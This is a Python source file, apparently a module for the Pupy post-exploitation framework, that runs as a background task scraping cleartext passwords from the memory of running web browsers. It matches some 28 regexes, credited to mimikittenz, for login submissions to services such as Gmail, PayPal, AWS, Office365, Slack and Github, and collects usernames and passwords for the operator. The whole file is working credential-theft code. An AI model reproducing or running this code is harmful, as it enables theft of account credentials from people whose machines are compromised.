#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author: Nicolas VERDIER (contact@n1nj4.eu)

"""
This script uses memorpy to dumps cleartext passwords from browser's memory
It has been tested on both windows 10 and ubuntu 16.04
The regex have been taken from the mimikittenz https://github.com/putterpanda/mimikittenz
"""
import psutil
import pupy
import sys
import time

from memorpy import MemWorker, ProcessException


def start(poll=20):
    if pupy.manager.active(PwdMon):
        return False

    try:
        pupy.manager.create(
            PwdMon
        )
    except:
        return False

    return True

def dump():
    mon = pupy.manager.get(PwdMon)
    if mon:
        return mon.results

def stop():
    mon = pupy.manager.get(PwdMon)
    if mon:
        pupy.manager.stop(PwdMon)
        return mon.results


class PwdMon(pupy.Task):
    def __init__(self, manager, poll=60):
        super(PwdMon, self).__init__(manager)
        self.duplicates = set()
        self.poll = poll

        if sys.platform == "win32":
            self.browser_list = ["iexplore.exe", "firefox.exe", "chrome.exe", "opera.exe", "MicrosoftEdge.exe", "microsoftedgecp.exe"]
        else:
            # self.browser_list = ["firefox", "iceweasel", "chromium", "chrome"]
            self.browser_list = ["firefox"]

        # from https://github.com/putterpanda/mimikittenz
        self.mimikittenz_regex = [
            ("Google","identifier=.{1,99}&continue=.{1,99}&password=.{1,99}&"),
            ("Gmail","&Email=.{1,99}?&Passwd=.{1,99}?&PersistentCookie="),
            ("Dropbox","login_email=.{1,99}&login_password=.{1,99}&"),
            ("SalesForce","&display=page&username=.{1,32}&pw=.{1,16}&Login="),
            ("Office365","login=.{1,32}&passwd=.{1,22}&PPSX="),
            ("MicrosoftOneDrive","login=.{1,42}&passwd=.{1,22}&type=.{1,2}&PPFT="),
            ("PayPal","login_email=.{1,48}&login_password=.{1,16}&submit=Log\\+In&browser_name"),
            ("awsWebServices","&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1="),
            ("OutlookWeb","&username=.{1,48}&password=.{1,48}&passwordText"),
            ("Slack","&crumb=.{1,70}&email=.{1,50}&password=.{1,48}"),
            ("CitrixOnline","emailAddress=.{1,50}&password=.{1,50}&submit"),
            ("Xero ","fragment=&userName=.{1,32}&password=.{1,22}&__RequestVerificationToken="),
            ("MYOB","UserName=.{1,50}&Password=.{1,50}&RememberMe="),
            ("JuniperSSLVPN","tz_offset=-.{1,6}&username=.{1,22}&password=.{1,22}&realm=.{1,22}&btnSubmit="),
            ("Twitter","username_or_email%5D=.{1,42}&session%5Bpassword%5D=.{1,22}&remember_me="),
            ("Facebook","lsd=.{1,10}&email=.{1,42}&pass=.{1,22}&(?:default_)?persistent="),
            ("LinkedIN","session_key=.{1,50}&session_password=.{1,50}&isJsEnabled"),
            ("Malwr","&username=.{1,32}&password=.{1,22}&next="),
            ("VirusTotal","password=.{1,22}&username=.{1,42}&next=%2Fen%2F&response_format=json"),
            ("AnubisLabs","username=.{1,42}&password=.{1,22}&login=login"),
            ("CitrixNetScaler","login=.{1,22}&passwd=.{1,42}"),
            ("RDPWeb","DomainUserName=.{1,52}&UserPass=.{1,42}&MachineType"),
            ("JIRA","username=.{1,50}&password=.{1,50}&rememberMe"),
            ("Redmine","username=.{1,50}&password=.{1,50}&login=Login"),
            ("Github","%3D%3D&login=.{1,50}&password=.{1,50}"),
            ("BugZilla","Bugzilla_login=.{1,50}&Bugzilla_password=.{1,50}"),
            ("Zendesk","user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}"),
            ("Cpanel","user=.{1,50}&pass=.{1,50}"),
        ]

    def dump_browser_passwords(self):

        for proc in psutil.process_iter():
            if proc.name().lower() in [x.lower() for x in self.browser_list]:
                try:
                    mw = MemWorker(pid=proc.pid)
                except ProcessException:
                    continue

                for service, regex in self.mimikittenz_regex:
                    try:
                        for x in mw.mem_search(regex, ftype='re'):
                            passwd = None
                            if type(x) == tuple:
                                for i in x:
                                    try:
                                        passwd = i.read(type="string", maxlen=100, errors='ignore')
                                    except Exception:
                                        continue
                            else:
                                try:
                                    passwd = x.read(type="string", maxlen=100, errors='ignore')
                                except Exception:
                                    pass

                            if passwd:
                                result = (proc.name(), service, passwd)
                                if result not in self.duplicates:
                                    self.duplicates.add(result)
                                    yield result
                    except Exception:
                        continue

    def task(self):
        while self.active:
            for proc, service, pwd in self.dump_browser_passwords():
                self.append((proc, service, pwd))

            time.sleep(self.poll)
